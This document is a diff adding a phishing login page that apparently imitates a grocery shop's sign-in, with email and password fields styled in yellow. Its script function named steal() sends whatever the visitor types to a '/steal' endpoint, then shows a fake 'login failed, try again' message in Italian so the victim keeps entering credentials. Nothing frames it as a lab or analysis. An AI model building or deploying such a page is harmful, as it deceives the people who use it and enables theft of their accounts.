@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login</title>
+  <style>
+    body {
+      background-color: #ffdd00;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    img {
+      width: 100px;
+      margin-bottom: 40px;
+    }
+
+    h2 {
+      margin: 10px 0 20px;
+    }
+
+    .form-container {
+      background-color: #ffe94d;
+      padding: 15px;
+      border-radius: 5px;
+      width: 250px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 15px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 35px 10px 10px;
+      font-size: 16px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      background-color: transparent;
+    }
+
+    .icon {
+      position: absolute;
+      right: 10px;
+      top: 10px;
+      cursor: pointer;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: black;
+      color: white;
+      border: none;
+      font-size: 16px;
+      border-radius: 20px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="grocery-store.png" alt="Cart Logo" />
+  <h2>Log in.</h2>
+
+  <div class="form-container">
+    <div class="input-group">
+      <input type="email" placeholder="Email" id="email" required />
+      <span class="icon">📧</span>
+    </div>
+
+    <div class="input-group">
+      <input type="password" placeholder="Password" id="password" required />
+      <span class="icon" onclick="togglePassword()">👁️</span>
+    </div>
+
+    <button onclick="steal()">Log in</button>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pwd = document.getElementById("password");
+      pwd.type = pwd.type === "password" ? "text" : "password";
+    }
+
+    function steal() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      fetch("/steal", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+      }).then(() => {
+        alert("Login fallito. Riprova.");
+      });
+    }
+  </script>
+
+</body>
+</html>
